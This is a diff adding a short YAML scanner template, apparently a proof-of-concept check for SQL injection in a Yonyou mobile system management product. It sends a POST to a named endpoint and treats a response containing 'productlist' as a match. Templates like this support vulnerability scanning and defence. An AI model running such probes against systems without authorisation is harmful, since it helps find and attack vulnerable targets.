@@ -1,0 +1,14 @@
+name: poc-yaml-用友-移动系统管理-sql
+description: >-
+  sql注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /maportal/appmanager/init
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "appname=1&sys_type=&loginmode=&joinmode="
+    expression:
+      status: 200
+      body_all: ["productlist"]
